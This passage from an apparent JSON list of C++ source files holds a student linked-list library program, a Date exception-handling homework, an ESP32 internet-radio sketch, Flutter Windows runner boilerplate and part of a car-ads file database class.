Availability\\t|\\tbook pos.\\t|\\n\\n\";\n    cout << \"--------------------------------------------------------------------------\\n\";\n    int i = head;\n    cout << a[i].book_no << \"\\t|\\t\" << a[i].title << \"\\t|\\t\" << a[i].author << \"\\t|\\t\" << a[i].isbn << \"\\t|\\t\" << a[i].availability_stat << i << \"\\t|\\n\";\n}\nvoid display(int head)\n{\n    int i = head;\n    cout << \"\\n\\ncount\\t|\\tBook No\\t|\\tTitle\\t|\\tAuthor\\t|\\tISBN\\t| Availability\\t|  book pos.\\t|  next\\n\\n \";\n    cout << \"-------------------------------------------------------------------------------------------------------------------------\\n\";\n    int count = 1;\n    while (i != 0)\n    {\n        if (a[i].book_no != -1)\n        {\n            cout << count << \"\\t|\\t\" << a[i].book_no << \"\\t|\\t\" << a[i].title << \"\\t|\\t\" << a[i].author << \"\\t|\\t\" << a[i].isbn << \"\\t|\\t\" << a[i].availability_stat << \"\\t|\\t\" << i << \"\\t|\\t\" << a[i].next << \"\\t|\\n \";\n        }\n        count++;\n        i = a[i].next;\n    }\n    cout << \"NULL\" << endl;\n}\nvoid insert()\n{\n    int new_book_no, temp;\n    string new_title, new_author, new_isbn;\n    int new_availability_stat;\n\n    cout << \"Enter book number : \" << endl;\n    cin >> new_book_no;\n    cout << endl;\n    cout << \"Enter Title of the Book : \";\n    cin >> new_title;\n    cout << endl;\n    cout << \"Enter Author : \";\n    cin >> new_author;\n    cout << \"Enter ISBN : \";\n    cin >> new_isbn;\n    cout << endl;\n    cout << \"Enter availability status : \";\n    cin >> new_availability_stat;\n    cout << endl;\n    cout << \"Enter book_no after which you want to insert: \";\n    cin >> temp;\n    for (int i = 0; i < max_node; i++)\n    {\n        if (a[i].book_no == temp)\n        {\n            for (int j = i + 1; j < max_node; j++)\n            {\n                if (a[j].book_no == -1)\n                {\n                    a[j].book_no = new_book_no;\n                    a[j].title = new_title;\n                    a[j].author = new_author;\n                    a[j].isbn = new_isbn;\n                    a[j].availability_stat = new_availability_stat;\n                    a[j].next = a[i].next;\n                    a[i].next = j;\n                    return;\n                }\n            }\n        }\n    }\n    cout << \"Element not found\" << endl;\n}\nint delete_data(int head)\n{\n    int temp;\n    cout << \"Enter book_no number you want to delete : \";\n    cin >> temp;\n    int prev = 0;\n    int current = head;\n    if (a[current].book_no == temp)\n    {\n        a[current].book_no = -1;\n        head = a[current].next;\n    }\n    while (current != 0)\n    {\n        prev = current;\n        current = a[current].next;\n        if (a[current].book_no == temp)\n        {\n            a[current].book_no = -1;\n            a[prev].next = a[current].next;\n            a[current].next = 0;\n            return 0;\n        }\n    }\n    cout << \"Element not found\";\n    return head;\n}\n\nvoid search(int head)\n{\n    int val;\n    cout << \"Enter element you want to find: \";\n    cin >> val;\n    int i = head;\n    bool flag = true;\n    while (i != 0)\n    {\n        if (a[i].book_no == val)\n        {\n            cout << \"book_no found\" << endl;\n            display_search(i);\n            flag = false;\n        }\n        i = a[i].next;\n    }\n    if (flag == true)\n    {\n        cout << \"book_no not found\";\n    }\n}\nint main()\n{\n    int head = create();\n    cout << \" Library Created... \" << endl;\n    int ch;\n    do\n    {\n        cout << \"Menu\\n1)insert\\n2)display\\n3)delete_book_no\\n4)search\\n5)exit\\nEnter your choice : \";\n        cin >> ch;\n        switch (ch)\n        {\n        case 1:\n            insert();\n            break;\n        case 2:\n            display(head);\n            break;\n        case 3:\n            delete_data(head);\n            break;\n        case 4:\n            search(head);\n            break;\n        case 5:\n            exit(0);\n        }\n        cout << \"\\ndo you want to continue(1/0) : \";\n        cin >> ch;\n    } while (ch == 1);\n    return 0;\n}",
    "/**\n * @file\t\tsample.cpp\n * @brief\t\t\n * @author\t\tJeong Hoon (Sian) Choi\n * @version\t\t1.0.0\n * @date\t\t2024-04-03\n */\n\n#include \"sample.h\"\n\n/* C & CPP */\n/*\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n*/\n\n#if _TARGET_OS == OS_WINDOWS\n\n#elif _TARGET_OS == OS_LINUX\n\n/* Definition */\n\n/* ASM codes */\n/*\nasm(R\"ASM(\n  ; assembly code x86-64 AT&T(fastcall-cdecl)\nfunc:\n  .cfi_startproc\n        pushq %rbp\n        .cfi_def_cfa_offset 16\n        .cfi_offset 6, -16\n        movq %rsp, %rbp\n        .cfi_def_cfa_register 6\n        movl %edi, -4(%rbp)  ; %rdi -> %rsi -> %rdx -> %rcx ->\n        movl %esi, -8(%rbp)  ; %r8  -> %r9  -> stack\n; return value %eax\n        popq %rbp\n\t\t\t\t.cf_def_cfa 7, 8\n\t\t\t\tret\n\t\t\t\t.cfi_endproc\n)ASM\");\n*/\n\n/* Data structures definition - struct & class */\n\n/*\n\nSample::Sample(const Sample& src) {\n\t// Deep Copy\n}\n\nSample& Sample::operator=(const Sample& src) {\n\tif(this == &src) {\n\t\treturn *this;\n\t}\n\t\n\tSample temp(src);\n\tswap(*this, temp);\n\treturn *this;\n}\n\nSample::Sample(Sample&& src) noexcept : Sample() {\n\tswap(*this, src);\n}\n\nSample& Sample::operator=(Sample&& src) noexcept {\n\tSample temp(std::move(src));\n\tswap(*this, temp);\n\treturn *this;\n}\n\n*/\n\n/* Functions definition */\n\n/*\n\nvoid swap(Sample& lhs, Sample& rhs) noexcept {\n\t// shallow copy\n    // using std::swap;\n}\n\n*/\n\n#endif // OS dependency\n\n/*\n#ifdef __cplusplus\n}\n#endif\n*/\n",
    "/*\n Program Name: Exception_Handling.cpp\n Programmer: Moris Gomez\n Date: Tuesday 05/3/2024\n Version Control: 10.0\n About: Week 12, CSCI 2, HW.\n Description:\n Design a class called Date. The class should store a date in\n three integers: month, day, and year.\n There should be member functions to print the date in the following forms:\n\n 12/25/2015\n December 25, 2015\n 25 December 2015\n\n The class should implement the following exception classes:\n\n InvalidDay->Throw when an invalid day (< 1 or > 31) is passed to the class.\n InvalidMonth->Throw when an invalid month (< 1 or > 12) is passed to the class.\n */\n\n#include <iostream>\nusing namespace std;\n\nclass Date\n{\nprivate:\n    int month;\n    int day;\n    int year;\npublic:\n    //nested class for throwing object type to catch:\n    class InvalidDay\n    {\n        //empty class btw.\n    }; //end nested class InvalidDay.\n    \n    //nested class for throwing object type to catch:\n    class InvalidMonth\n    {\n        //empty class btw.\n    }; //end nested class InvalidMonth.\n    \n    //constructor:\n    Date(int m, int d, int y)\n    {\n        if(m < 1 || m > 12)\n        {\n            throw InvalidMonth();\n        }\n        else if(d < 1 || d > 31)\n        {\n            throw InvalidDay();\n        }\n        else\n        {\n            month = m;\n            day = d;\n            year = y;\n        }\n    }\n    \n    //function #1:\n    void print1()\n    {\n        cout << month << \"/\" << day << \"/\" << year << endl;\n    } //end function.\n    \n    //function #2:\n    void print2()\n    {\n        string mon;\n        if(month == 1)\n        {\n            mon = \"January\";\n        }\n        else if(month == 2)\n        {\n            mon = \"February\";\n        }\n        else if(month == 3)\n        {\n            mon = \"March\";\n        }\n        else if(month == 4)\n        {\n            mon = \"April\";\n        }\n        else if(month == 5)\n        {\n            mon = \"May\";\n        }\n        else if(month == 6)\n        {\n            mon = \"June\";\n        }\n        else if(month == 7)\n        {\n            mon = \"July\";\n        }\n        else if(month == 8)\n        {\n            mon = \"August\";\n        }\n        else if(month == 9)\n        {\n            mon = \"September\";\n        }\n        else if(month == 10)\n        {\n            mon = \"October\";\n        }\n        else if(month == 11)\n        {\n            mon = \"November\";\n        }\n        else if(month == 12)\n        {\n            mon = \"December\";\n        }\n       //December 25, 2015\n        cout << mon << \" \" << day << \", \" << year << endl;\n    } //end function.\n    \n    //function #3:\n    void print3()\n    {\n        string mon;\n        if(month == 1)\n        {\n            mon = \"January\";\n        }\n        else if(month == 2)\n        {\n            mon = \"February\";\n        }\n        else if(month == 3)\n        {\n            mon = \"March\";\n        }\n        else if(month == 4)\n        {\n            mon = \"April\";\n        }\n        else if(month == 5)\n        {\n            mon = \"May\";\n        }\n        else if(month == 6)\n        {\n            mon = \"June\";\n        }\n        else if(month == 7)\n        {\n            mon = \"July\";\n        }\n        else if(month == 8)\n        {\n            mon = \"August\";\n        }\n        else if(month == 9)\n        {\n            mon = \"September\";\n        }\n        else if(month == 10)\n        {\n            mon = \"October\";\n        }\n        else if(month == 11)\n        {\n            mon = \"November\";\n        }\n        else if(month == 12)\n        {\n            mon = \"December\";\n        }\n       //25 December 2015\n        cout << day << \" \" << mon << \" \" << year << endl;\n    } //end function.\n}; //end class Date.\n\n\nint main()\n{\n    try\n    {\n        //Date one(13, 2, 2024); //passed.\n        //Date one(13, 37, 2024); //passed.\n        //Date one(5, 3, 2024); //passed.\n        Date one(5, -2, 2024); //passed.\n        \n        one.print1();\n        one.print2();\n        one.print3();\n    } //end try.\n    \n    catch(Date::InvalidMonth) //type of throw & catch is object.\n    {\n        cout << \"[ERROR] <-- Months cannot be less than 1 or greater than 12 -->\" << endl;\n    } //end catch.\n    \n    catch(Date::InvalidDay) //type of throw & catch is object.\n    {\n        cout << \"[ERROR] <-- Days cannot be less than 1 or greater than 31 -->\" << endl;\n    } //end catch.\n\n    return 0;\n}\n",
    "/**\n * Program      CYD_InternetRadio.cpp\n * Author       2024-04-23 Charles Geiser (https://www.dodeka.ch)  \n *  \n * Purpose      The program shows how to use the excellent AudioTools\n *              library from Phil Schatzmann.  \n * \n * Board        ESP32-2432S028R aka CYD or Cheap Yellow Display\n * \n * Remarks      \ud83d\udc49 No DAC such as the Max98357, PCM5102, UDA1334A or VS1053B \n *              is required for the output, but then the touchpad is blocked \n *              because the DAC output pin GPIO_NUM_25 is used for the \n *              clock signal of the touchpad of the CYD.\n * \n * ------------ With external DAC UDA1334A -----------------------------\n * \n *                              .-----------------. \n *                  22  -->     o DIN             |  \n *                  21  -->     o WSEL       UDA  |    \n *                  27  -->     o BCLK      1334A |   \n *                  3.3V-->     o Vin (3.3-5V)  +---- 3.5mm Stereo Headphone jack \n *                  GND -->     o GND           +----\n *                              `-----------------\u00b4    \n * \n * ---------------------------------------------------------------------\n *   \n *\n * References   https://github.com/pschatzmann\n *              https://github.com/pschatzmann/arduino-audio-tools\n *              https://github.com/pschatzmann/arduino-audio-tools/wiki/Volume-Control\n */\n#include <Arduino.h>\n#include <AudioTools.h>\n#include <AudioCodecs/CodecMP3Helix.h>\n#include \"lgfx_ESP32_2432S028.h\"\n#include \"UiComponents.h\"\n#include \"Wait.h\"\n\nconst char ssid[]            = \"Your SSID\";\nconst char password[]        = \"Your Password\";\nconst char NTP_SERVER_POOL[] = \"ch.pool.ntp.org\";\nconst char TIME_ZONE[]       = \"MEZ-1MESZ-2,M3.5.0/02:00:00,M10.5.0/03:00:00\";\nconst char HOST_NAME[]       = \"CYD-RADIO\";\n\nI2SConfig config;\nICYStream url(ssid, password); // Your WiFi SSID and password\nI2SStream i2s;   // final output of decoded stream, fetched to the external DAC\nVolumeStream volume(i2s);\nEncodedAudioStream dec(&volume, new MP3DecoderHelix()); // decode stream and route it to the volume control\nStreamCopy copier(dec, url);  // copies mp3-stream from url to the decoder\n\nusing Action = void(&)(LGFX &lcd);\nusing Radiostation = struct rs{ const char *name; const char *url; };\n\n//                    Text       Background  Border      Shadow      Font\nUiTheme dateTimeTheme(TFT_GREEN, DARKERGREY, DARKERGREY, DARKERGREY, &fonts::FreeSans12pt7b);\n\nenum Rotation {PORTRAIT, LANDSCAPE};\nLGFX lcd;\nGFXfont myFont = fonts::DejaVu18;\nWait waitUserInput(100);\nWait waitDateTime(1000);\n\nextern void nop(LGFX &lcd);\nextern void grid(LGFX &lcd);\nextern void initDisplay(LGFX &lcd, uint8_t rotation=0, GFXfont *theFont=&myFont, Action greet=nop);\nextern GFXfont defaultFont;\n\n\nRadiostation radioStation[] =\n{\n  { \"SRF1 AG-SO\",    \"http://stream.srg-ssr.ch/m/regi_ag_so/mp3_128\" },\n  { \"SRF2\",          \"http://stream.srg-ssr.ch/m/drs2/mp3_128\" },\n  { \"SRF3\",          \"http://stream.srg-ssr.ch/m/drs3/mp3_128\" },\n  { \"SRF4 NEWS\",     \"http://stream.srg-ssr.ch/m/drs4news/mp3_128\" },\n  { \"SWISS CLASSIC\", \"http://stream.srg-ssr.ch/m/rsc_de/mp3_128\" },\n  { \"SWISS JAZZ\",    \"http://stream.srg-ssr.ch/m/rsj/mp3_128\" },\n  { \"MUSIKWELLE\",    \"http://stream.srg-ssr.ch/m/drsmw/mp3_128\" },\n  { \"BLASMUSIK\",     \"http://stream.bayerwaldradio.com/allesblasmusik\" },\n  { \"Klassik Radio\", \"http://live.streams.klassikradio.de/klassikradio-deutschland/stream/mp3\" },\n  { \"DLF\",           \"http://st01.dlf.de/dlf/01/128/mp3/stream.mp3\" },\n  { \"WDR\",           \"https://wdr-wdr2-rheinland.icecastssl.wdr.de/wdr/wdr2/rheinland/mp3/128/stream.mp3\" },\n  { \"SWR4\",          \"https://liveradio.swr.de/sw282p3/swr4bw/\" },\n  { \"KVB\",           \"http://kvbstreams.dyndns.org:8000/wkvi-am\" },\n};\nconstexpr int nbrRadiostations = sizeof(radioStation) / sizeof(radioStation[0]);\nint   currentStation = 4;    // preselected station\nfloat currentVolume  = 0.33; // initial loudness\n\n// Forward declaration of functions\nvoid firstStation();\nvoid lastStation();\nvoid nextStation();\nvoid prevStation();\nvoid showCurrent();\nvoid cbShowMetaData(MetaDataType info, const char *str, int len);\n\n\nclass UiPanelTitle : public UiPanel\n{\n    public:\n        UiPanelTitle(LGFX &lcd, int x, int y, int w, int h, int bgColor, bool hidden=true) : \n            UiPanel(lcd, x, y, w, h, bgColor, hidden)\n        {\n            if (! _hidden) { show(); }\n        }\n\n        void show()\n        {\n            UiPanel::show();\n            _lcd.setTextDatum(textdatum_t::middle_left);\n            panelText(60, 20, \"CYD Internet Radio\", TFT_MAROON, fonts::DejaVu18);\n        }\n    private:\n};\n\n\nclass UiPanelDateTime : public UiPanel\n{\n    public:\n      UiPanelDateTime(LGFX & lcd, int x, int y, int w, int h, int bgColor, bool hidden=true) :\n        UiPanel(lcd, x, y, w, h, bgColor, hidden)\n        {\n          if (! _hidden) { show(); }\n        }\n\n        void updateDateTime();\n\n        void show()\n        {\n            UiPanel::show();\n            for (int ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"proj\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\n#include <math.h>\n#include <string>\n#include <fstream>\n#include <random>\n#include <cstring>\n#include <cstdlib>\n#include <conio.h>\n#include <Windows.h>\n#include <locale>\n#include <codecvt>\n#include <chrono>\n#include <iomanip>\n#include <sstream>\n#include <ctime>\nusing namespace std;\nclass DBAds {\npublic:\n    string DB = \"./DB/ads.txt\";\n    vector<vector<string>> getAllAds() {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) { // \u0415\u0441\u043b\u0438 \u0432 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0438 \u0443\u0436\u0435 11 \u0441\u0442\u0440\u043e\u043a\n                if (currentAd[8] == \"1\" ) {// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0442\u043e, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\n                    ads.push_back(currentAd);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0438\u0440\u0443\u044e\u0449\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\n                }\n                currentAd.clear(); // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e\n            }\n        }\n        file_r.close();\n        return ads;\n    }\n    vector<vector<string>> getAllAdsByBrand(string brand) {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) { // \u0415\u0441\u043b\u0438 \u0432 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0438 \u0443\u0436\u0435 11 \u0441\u0442\u0440\u043e\u043a\n                if (currentAd[8] == \"1\"&&currentAd[0] == brand) {// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0442\u043e, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\n                    ads.push_back(currentAd);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0438\u0440\u0443\u044e\u0449\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\n                }\n                currentAd.clear(); // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e\n            }\n        }\n        file_r.close();\n        return ads;\n    }\n    vector<vector<string>> getAllAdsByModel(string model) {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) { // \u0415\u0441\u043b\u0438 \u0432 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0438 \u0443\u0436\u0435 11 \u0441\u0442\u0440\u043e\u043a\n                if (currentAd[8] == \"1\" && currentAd[1] == model) {// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0442\u043e, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\n                    ads.push_back(currentAd);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0438\u0440\u0443\u044e\u0449\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\n                }\n                currentAd.clear(); // 